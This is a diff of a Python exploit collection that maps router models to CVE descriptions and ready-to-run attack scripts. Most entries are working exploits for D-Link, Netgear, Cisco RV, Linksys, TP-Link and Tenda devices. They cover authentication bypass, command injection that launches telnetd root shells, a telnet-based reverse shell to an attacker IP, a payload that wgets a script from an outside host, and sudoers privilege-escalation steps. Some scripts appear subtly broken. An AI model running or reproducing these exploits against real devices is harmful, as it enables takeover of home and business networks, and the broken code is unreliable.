-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ]
@@ -1701,7 +1770,6 @@ model_exp_dic["Netgear_WNDR4500v2"] = {
     "CVE-2019-17372":
 ["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
 """
-
 #!/usr/bin/env python
 
 import sys
@@ -1755,9 +1823,9 @@ def close_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
@@ -1770,16 +1838,16 @@ def open_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
@@ -1797,9 +1865,9 @@ if __name__ == '__main__':
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ]
@@ -1841,7 +1909,7 @@ model_exp_dic['Netgear_R6700'] = {
 }
 
 model_exp_dic["DIR-859"] = {
-    "CVE-2019–17621":
+    "CVE-2019-17621":
 ["The UPnP endpoint URL /gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network.\n['http://packetstormsecurity.com/files/156054/D-Link-DIR-859-Unauthenticated-Remote-Command-Execution.html'\n'https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104'\n'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10146']",
  """
 import socket
@@ -1849,29 +1917,29 @@ import os
 from time import sleep
 # Exploit By Miguel Mendez & Pablo Pollanco
 def httpSUB(server, port, shell_file):
-    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
+    print('\\n[*] Connection {host}:{port}'.format(host=server, port=port))
     con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
-    request += "Host: " + str(server) + str(port) + "\n"
-    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\n"
-    request += "NT: upnp:event\n"
-    request += "Timeout: Second-1800\n"
-    request += "Accept-Encoding: gzip, deflate\n"
-    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
-sleep(1)
+    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\\n"
+    request += "Host: " + str(server) + str(port) + "\\n"
+    request += "Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"
+    request += "NT: upnp:event\\n"
+    request += "Timeout: Second-1800\\n"
+    request += "Accept-Encoding: gzip, deflate\\n"
+    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n"
+    sleep(1)
     print('[*] Sending Payload')
     con.connect((socket.gethostbyname(server),port))
     con.send(request.encode())
     results = con.recv(4096)
-sleep(1)
+    sleep(1)
     print('[*] Running Telnetd Service')
     sleep(1)
-    print('[*] Opening Telnet Connection\n')
+    print('[*] Opening Telnet Connection\\n')
     sleep(2)
     os.system('telnet ' + str(server) + ' 9999')
-serverInput = raw_input('IP Router: ')
-portInput = 49152
-httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
+    serverInput = raw_input('IP Router: ')
+    portInput = 49152
+    httpSUB(serverInput, portInput, '`telnetd -p 9999 &`')
  """
  ],
     "CVE-2019-20215":
@@ -1883,11 +1951,11 @@ import socket
 from time import sleep
 # Exploit By Miguel Mendez - @s1kr10s
 def config_payload(ip, port):
-    header = "M-SEARCH * HTTP/1.1\n"
-    header += "HOST:"+str(ip)+":"+str(port)+"\n"
-    header += "ST:urn:device:1;telnetd\n"
-    header += "MX:2\n"
-    header += 'MAN:"ssdp:discover"'+"\n\n"
+    header = "M-SEARCH * HTTP/1.1\\n"
+    header += "HOST:"+ str(ip) + ":" +str(port)+"\\n"
+    header += "ST:urn:device:1;telnetd\\n"
+    header += "MX:2\\n"
+    header += 'MAN:"ssdp:discover"'+"\\n\\n"
     return header
 def send_conexion(ip, port, payload):
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
@@ -1897,13 +1965,13 @@ def send_conexion(ip, port, payload):
 if __name__== "__main__":
     ip = raw_input("Router IP: ")
     port = 1900
-print("\n---= HEADER =---\n")
+    print("\\n---= HEADER =---\\n")
     headers = config_payload(ip, port)
     print("[+] Preparando Header ...")
     print("[+] Enviando payload ...")
     print("[+] Activando servicio telnetd :)") 
     send_conexion(ip, port, headers)
-    print("[+] Conectando al servicio ...\n")
+    print("[+] Conectando al servicio ...\\n")
     sleep(5)
     os.system('telnet ' + str(ip))
 """
@@ -2180,8 +2248,8 @@ r = requests.request(method=method,url=url,headers=headers,auth=(username,passwo
 model_exp_dic["Netcomm_NF20"] = {
     "CVE-2022-4873":
 ["On Netcomm router models NF20MESH, NF20, and NL1902 a stack based buffer overflow affects the sessionKey parameter. By providing a specific number of bytes, the instruction pointer is able to be overwritten on the stack and crashes the application at a known location.\n['https://github.com/scarvell/advisories/blob/main/2022_netcomm_nf20mesh_unauth_rce.md']",
- '''
- #!/usr/bin/python3
+'''
+#!/usr/bin/python3
 """
 Netcomm NF20MESH Unauthenticated RCE
 Author: Brendan Scarvell
@@ -2253,7 +2321,7 @@ while not pwned:
 
     except requests.exceptions.ConnectionError:
         # successful exploitation hangs connection. Capture timeout so we dont hang forever
-        print("\n[*] got hit on libc @ 0xb65d9000")
+        print("\\n[*] got hit on libc @ 0xb65d9000")
     
     try:
         tn = telnetlib.Telnet(TARGET, 31337)
@@ -2464,7 +2532,140 @@ def main(*args):
 if __name__ == "__main__":
     main()
  """
-]
+],
+    "CVE-2022-20705&&CVE-2022-20707":
+    ["Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an attacker to do any of the following: Execute arbitrary code Elevate privileges Execute arbitrary commands Bypass authentication and authorization protections Fetch and run unsigned software Cause denial of service (DoS) For more information about these vulnerabilities, see the Details section of this advisory.\n['http://packetstormsecurity.com/files/170988/Cisco-RV-Series-Authentication-Bypass-Command-Injection.html'\n'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D']",
+"""
+from urllib3 import  encode_multipart_formdata
+import  requests
+import _thread
+import argparse
+
+class Upload():
+    def __init__(self,target_ip,target_port,Command,SSL_C):
+        self.ip=target_ip
+        self.port=target_port
+        self.cmd=Command
+        self.boundary="----WebKitFormBoundaryz6gIo5kcTkAlkCwX"
+        self.post_data=''
+        self.rq_header=''
+        self.ssl_c=SSL_C
+        self.generate_headers()
+        self.generate_payload()
+        self.Detect_Vuln()
+
+    def generate_payload(self):
+        boundary=self.boundary
+        fields = [("sessionid",(None,"EU6DJKEIWO",None)),
+                  ("file.path",(None,"doudoudedi",None)),
+                  ("filename",(None,"esp_test.xml",None)),
+                  ("pathparam",(None,"Firmware",None)),
+                  ("destination",(None,"x';{0};'".format(self.cmd),None)),
+                  ("option",(None,"x",None)),
+                  ("file", ("1.img", b'test', "Content-Type: application/octet-stream"))]
+        m = encode_multipart_formdata(fields, boundary=boundary)
+        self.post_data=m[0]
+
+    def generate_headers(self):
+        self.rq_header={
+            "Host":self.ip+":"+str(self.port),
+            "Content-Length":"955",
+            "Accept":"application/json, text/plain, */*",
+            "optional-header":"header-value",
+            "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Content-Type":"multipart/form-data; boundary="+self.boundary,
+            "Accept-Encoding":"gzip, deflate",
+            "Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Cookie":"sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTI3LjAuMC4xLzEx;",
+            "Connection":"close"
+        }
+    def Detect_Vuln(self):
+        boundary=self.boundary
+        fields = [("sessionid",(None,"EU6DJKEIWO",None)),
+                  ("file.path",(None,"doudoudedi",None)),
+                  ("filename",(None,"esp_test.xml",None)),
+                  ("pathparam",(None,"Firmware",None)),
+                  ("destination",(None,"x';id;'",None)),
+                  ("option",(None,"x",None)),
+                  ("file", ("1.img", b'test', "Content-Type: application/octet-stream"))]
+        m = encode_multipart_formdata(fields, boundary=boundary)
+        if self.ssl_c == 1:
+            try:
+                attack_url = "https://" + self.ip + ":" + str(self.port) + "/upload"
+                #proxies = {'http': 'http://127.0.0.1:8080' , 'https': 'http://127.0.0.1:8080'}
+                res = requests.post(attack_url, headers=self.rq_header, data=m[0], verify=False)#,proxies=proxies )
+                #print(res.text)
+                if "301 Moved Permanently" in res.text:
+                    print("Vulnerability exists")
+                if "www-data" in res.text:
+                    print("Vulnerability exists id Command is test")
+                    print(res.text)
+                else:
+                    print("faile hahah")
+                    print(res.text)
+            except Exception as e:
+                print(e)
+        else:
+            try:
+                attack_url = "http://" + self.ip + ":" + str(self.port) + "/upload"
+                res = requests.post(attack_url, headers=self.rq_header, data=m[0])
+                if "301 Moved Permanently" in res.text:
+                    print("Vulnerability exists")
+                if "www-data" in res.text:
+                    print("Vulnerability exists id Command is test")
+                    print(res.text)
+                else:
+                    print("faile")
+                    print(res.text)
+            except Exception as e:
+                print(e)
+
+    def attack(self):
+        if self.ssl_c == 1:
+            try:
+                attack_url="https://"+self.ip+":"+str(self.port)+"/upload"
+                print(attack_url)
+                res=requests.post(attack_url,headers=self.rq_header,data=self.post_data,verify=False)
+                if "301 Moved Permanently" in res.text:
+                    print("cmd execute success")
+                else:
+                    print("faile")
+                    print(res.text)
+            except Exception as e:
+                print("error: " +e)
+        else:
+            try:
+                attack_url="http://"+self.ip+":"+str(self.port)+"/upload"
+                res = requests.post(attack_url, headers=self.rq_header, data=self.post_data)
+                if "301 Moved Permanently" in res.text:
+                    print("cmd execute success")
+                else:
+                    print("faile")
+                    print(res.text)
+            except Exception as e:
+                print(e)
+
+
+if __name__=="__main__":
+    '''
+    Privilege Escalation
+        echo 'www-data ALL=(ALL) NOPASSWD: ALL'>/tmp/www-data-sudo
+        /usr/bin/confd_cli -U 0 -G 0 -u root -g root
+        append /etc/sudoers
+        sudo /bin/sh
+    '''
+    print("RV34X<=1.0.03.24,RV160/260<=1.0.01.05 POC by doudou")
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--rhost', required=True, type=str, default=None, help='Remote Target Address (IP/FQDN)')
+    parser.add_argument('--rport', required=False, type=int, default=80, help='Remote Target Port')
+    parser.add_argument('--SSL', required=False, type=int, default=0, help='SSL 1 is HTTPS or HTTP')
+    parser.add_argument('--cmd', required=False, type=str, default=None, help='Command Execute')
+    args = parser.parse_args()
+    exp=Upload(args.rhost,args.rport,args.cmd,args.SSL)
+    exp.attack()
+
+"""     
+     ]
 }
 
 
@@ -2889,7 +3090,7 @@ if sys.argv[1] == 'shell':
     t = threading.Thread(target=os.system, args=(NC_COMMAND,))
     t.start()
 
-    print("[+] Sending reverse shell to %s...\n" % victim)
+    print("[+] Sending reverse shell to %s...\\n" % victim)
     json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
     requests.post(url, json=json, verify=False)
 
@@ -2971,6 +3172,8 @@ model_exp_dic["DSL-3782"] = {
     "CVE-2023-27216":
 ["An issue found in D-Link DSL-3782 v.1.03 allows remote authenticated users to execute arbitrary code as root via the network settings page.\n['https://lessonsec.com/cve/cve-2023-27216/']",
 """
+#name=doudou222;cmd;
+#
 POST /cgi-bin/New_GUI/VirtualServer.asp HTTP/1.1
 Host: 192.168.1.1
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
@@ -2984,7 +3187,7 @@ Origin: http://192.168.1.1
 Connection: close
 Referer: http://192.168.1.1/cgi-bin/New_GUI/VirtualServer.asp
 
-sessionKey=783368690&conn_type=ATM&buttonType=apply&editRow=0&enable_rules=Yes&scheduleValue=-&inner_display=0&enable0=&enable_vs_rules_ck=on&name=doudou222;ls>/doudou1;&inIP=192.168.1.8&insPort=8888&inePort=9999&exsPort=8088&exePort=9000&protocol=ALL&pf_Schedule=Always
+sessionKey=783368690&conn_type=ATM&buttonType=apply&editRow=0&enable_rules=Yes&scheduleValue=-&inner_display=0&enable0=&enable_vs_rules_ck=on&name=doudou222;cmd;&inIP=192.168.1.8&insPort=8888&inePort=9999&exsPort=8088&exePort=9000&protocol=ALL&pf_Schedule=Always
 """
  ],
     "CVE-2018-8898":
@@ -2996,4 +3199,262 @@ curl --data "Password=[NEW_PASSWORD_SET_BY_THE_ATTACKER]" \
 http://192.168.1.1/cgi-bin/New_GUI/Set/Admin.asp
 """
  ]
+}
+
+model_exp_dic["linksys_E2000v1"]={
+    "CVE-2023-31740":
+    ["There is a command injection vulnerability in the Linksys E2000 router with firmware version 1.0.06. If an attacker gains web management privileges, they can inject commands into the post request parameters WL_atten_bb, WL_atten_radio, and WL_atten_ctl in the apply.cgi interface, thereby gaining shell privileges.\n['https://github.com/D2y6p/CVE/blob/main/Linksys/CVE-2023-31740/Linksys_E2000_RCE.pdf\n']",
+"""
+# Through my analysis of the program, I have found a way to bypass authentication and upgraded this vulnerability to unauthenticated command execution. If you have any questions, please contact doudoudedi233@gmail.com
+# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+import requests
+# Press the green button in the gutter to run the script.
+if __name__ == '__main__':
+    print('start !!! ')
+
+    target = input("Enter Target IP : ")
+    cmd = input("Enter you want cmd : ")
+
+    #cmd_url_encode = urllib.parse.quote(cmd)
+    session = requests.session()
+
+    burp0_url = "http://" + target + ":80/apply.cgi?main.js&main.js="
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
+                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                     "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+                     "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + target,
+                     "Connection": "close",
+                     "Referer": "http://" + target + "/apply.cgi",
+                     "Upgrade-Insecure-Requests": "1"}
+    burp0_data = {"submit_button": "WL_WPATable", "change_action": '', "submit_type": '', "gui_action": "Apply",
+                  "security_mode_last": '', "wl_wep_last": '', "wait_time": "3", "wps_nwkey": "1231231123123123",
+                  "wl_wps_mode": "enabled", "wps_security_auto": "1", "nvset_cgi": "wireless", "wl_crypto": "tkip",
+                  "security_mode2": "wpa_personal", "wl_wpa_psk": "1231231123123123",
+                  "WL_atten_bb": "`" + cmd + "`", "WL_atten_radio": "123", "WL_atten_ctl": "123"}
+    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+
+    print("end !!! ")
+# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+"""
+    ]
+}
+
+model_exp_dic["GO-RT-AC750"] = {
+    "CVE-2023-26822":
+    ["D-Link Go-RT-AC750 revA_v101b03 was discovered to contain a command injection vulnerability via the service parameter at soapcgi.main.\n['https://github.com/yzskyt/Vuln/blob/main/Go-RT-AC750/Go-RT-AC750.md']\n",
+"""
+from socket import *
+from os import *
+from time import *
+import sys
+'''
+all command
+        [, [[, arp, arping, basename, bunzip2, bzcat, bzip2, cat, chmod, cp, cut,
+        date, echo, egrep, expr, false, fgrep, free, grep, gunzip, gzip, halt,
+        hostname, ifconfig, init, insmod, ip, ipaddr, iplink, iproute, iprule,
+        iptunnel, kill, killall, killall5, ln, ls, lsmod, mkdir, mknod, modprobe,
+        mount, msh, mv, netstat, ping, ping6, poweroff, ps, pwd, reboot, rm, rmmod,
+        route, sed, sh, sleep, sysctl, tar, test, top, touch, tr, true, tunctl,
+        umount, uname, uptime, vconfig, vi, wc, yes, zcat
+
+'''
+if len(sys.argv)!=2:
+	print("Parameter error. python exp.py cmd")
+	exit(0)
+cmd = sys.argv[1]
+request = f"POST /soap.cgi?service=&&{cmd}& HTTP/1.1\\r\\n".encode()
+request += b"Host: localhost:49152\\r\\n"
+request += b"Content-Type: text/xml\\r\\n"
+request += b"Content-Length: 88\\r\\n"
+request += b"SOAPAction: a#b\\r\\n\\r\\n"
+ 
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((gethostbyname("192.168.0.1"), 49152))
+s.send(request)
+ 
+#sleep(10)
+#system('telnet 192.168.0.1 4123')
+"""     
+     ]
+}
+
+model_exp_dic["TP-Link_Archer_VR1600V"] = {
+    "CVE-2023-31756":
+    ["A command injection vulnerability exists in the administrative web portal in TP-Link Archer VR1600V devices running firmware Versions <= 0.1.0. 0.9.1 v5006.0 Build 220518 Rel.32480n which allows remote attackers, authenticated to the administrative web portal as an administrator user to open an operating system level shell via the 'X_TP_IfName' parameter.\n['https://stanleyjobsonau.github.io/tp-link-advisory.html']\n",
+"""
+POST /cgi?2 HTTP/1.1
+Host: 192.168.1.1
+User-Agent: python-requests/2.20.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+TokenID:
+Referer: http://192.168.1.1/
+Cookie: JSESSIONID=
+Content-Length: 81
+
+[WAN_IP_CONN#1,7,1,0,0,0#0,0,0,0,0,0]0,2
+X_TP_IfName=;telnetd -l sh;
+enable=1
+"""     
+]
+}
+
+model_exp_dic["TL-WPA4530_KIT_V2"] = {
+    "CVE-2023-31700":
+    ["TP-Link TL-WPA4530 KIT V2 (EU)_170406 and V2 (EU)_161115 is vulnerable to Command Injection via _httpRpmPlcDeviceAdd.\n['https://github.com/FirmRec/IoT-Vulns/blob/main/tp-link/postPlcJson/report.md']\n",
+"""
+POST /admin/powerline?form=plc_add HTTP/1.1
+Host: 192.168.100.2
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 68
+Origin: http://192.168.100.2
+Connection: close
+Referer: http://192.168.100.2/
+Cookie: Authorization=XXXXXXX
+
+xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh;
+"""
+     ]
+}
+
+model_exp_dic["iptime_c200"] = {
+    "CVE-2021-26614":
+["ius_get.cgi in IpTime C200 camera allows remote code execution. A remote attacker may send a crafted parameters to the exposed vulnerable web service interface which invokes the arbitrary shell command.\n['https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346']\n",
+ """
+
+ """]
+}
+
+
+model_exp_dic["tenda_cpx"] = {
+    "CVE-2023-23080":
+["Certain Tenda products are vulnerable to command injection. This affects Tenda CP7 Tenda CP7<=V11.10.00.2211041403 and Tenda CP3 v.10 Tenda CP3 v.10<=V20220906024_2025 and Tenda IT7-PCS Tenda IT7-PCS<=V2209020914 and Tenda IT7-LCS Tenda IT7-LCS<=V2209020914 and Tenda IT7-PRS Tenda IT7-PRS<=V2209020908.\n['https://github.com/fxc233/iot-vul/tree/main/Tenda/IPC']\n",
+"""
+from time import sleep
+import requests
+import socket
+import sys
+import os
+
+
+if __name__ == "__main__":
+	TARGET_IP = sys.argv[1]
+	SHELL_PORT = sys.argv[2]
+
+	SHELL_OPERATION = "<SYSTEMEX>telnetd -p %s -l /bin/sh &</SYSTEMEX>" % SHELL_PORT
+
+	print("\\x1b[01;38;5;214m[+] Connect to target ip\\x1b[0m")
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((TARGET_IP,1300))
+	sleep(0.5)
+
+	print("[+] Sending payload to %s ..." % TARGET_IP)
+	s.send(SHELL_OPERATION.encode())
+	
+	s.recv(1024)
+	sleep(1)
+	
+	print("\x1b[01;38;5;1m[+] Successfully connect to Port %s\\x1b[0m" % SHELL_PORT)
+	os.system("telnet %s %s" % (TARGET_IP,SHELL_PORT))
+	
+	s.close()
+"""
+ 
+ ]
+}
+
+model_exp_dic["Netgear_R9000"] = {
+    "CVE-2019-20760":
+    ["NETGEAR R9000 devices before 1.0.4.26 are affected by authentication bypass.\n['https://kb.netgear.com/000060639/Security-Advisory-for-Authentication-Bypass-on-R9000-PSV-2018-0615']\n",
+"""
+#!/usr/bin/python3
+from threading import Thread
+import requests
+import base64
+import sys
+if len(sys.argv)!=4:
+	print("Parameter error. python exp.py host_ip reverse_ip reverse_port")
+	exit(0)
+
+host_ip = sys.argv[1]
+reverse_ip = sys.argv[2]
+reverse_port = sys.argv[3]
+
+cmd = b"admin:`mknod /tmp/a p\\ntelnet {reverse_ip} {reverse_port} 0</tmp/a | /bin/sh 1>/tmp/a 2>/tmp/a`".format(reverse_port=reverse_port, reverse_ip=reverse_ip)
+assert(len(cmd) < 255)
+
+cmd_b64 = base64.b64encode(cmd).decode()
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Authorization": "Basic {}".format(cmd_b64) 
+}
+
+def attack():
+    try:
+        rep = requests.post("http://{host_ip}/cgi-bin/".format(host_ip=host_ip), headers=headers, timeout=1)
+        print(rep.text)
+    except Exception as e:
+        print(e)
+
+attack()
+"""     
+     ]
+}
+
+model_exp_dic["DIR-600_vB"] = {
+    "CVE-2023-33625":
+    ["D-Link DIR-600 Hardware Version B5, Firmware Version 2.18 was discovered to contain a command injection vulnerability via the ST parameter in the lxmldbc_system() function.\n['https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md'\n'https://hackmd.io/@naihsin/By2datZD2'\n]",
+"""
+import sys
+import os
+import socket
+from time import sleep
+# Exploit By Miguel Mendez - @s1kr10s
+def config_payload(ip, port):
+    header = "M-SEARCH * HTTP/1.1\\n"
+    header += "HOST:"+ str(ip) + ":" +str(port)+"\\n"
+    header += "ST:urn:device:1;telnetd\\n"
+    header += "MX:2\\n"
+    header += 'MAN:"ssdp:discover"'+"\\n\\n"
+    return header
+def send_conexion(ip, port, payload):
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
+    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
+    sock.sendto(payload,(ip, port))
+    sock.close()
+if __name__== "__main__":
+    ip = raw_input("Router IP: ")
+    port = 1900
+    print("\\n---= HEADER =---\\n")
+    headers = config_payload(ip, port)
+    print("[+] Preparando Header ...")
+    print("[+] Enviando payload ...")
+    print("[+] Activando servicio telnetd :)") 
+    send_conexion(ip, port, headers)
+    print("[+] Conectando al servicio ...\\n")
+    sleep(5)
+    os.system('telnet ' + str(ip))
+"""     
+     ]
+}
+
+model_exp_dic["DIR-823G_A1"] = {
+    "CVE-2023-26615":
+    ["D-Link DIR-823G firmware version 1.02B05 has a password reset vulnerability, which originates from the SetMultipleActions API, allowing unauthorized attackers to reset the WEB page management password.\n['https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/HNAP1'\n'https://github.com/726232111/VulIoT/tree/main/D-Link/DIR823G%20V1.0.2B05/HNAP1/SetMultipleActions']",
+"""
+a='`telnetd -p 8082 -l /bin/sh`' ; curl http://192.168.0.1/HNAP1 -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetPasswdSettings"' -d "'$a'" -s >/dev/null ; telnet 192.168.0.1 8082
+""" 
+     ]
 }
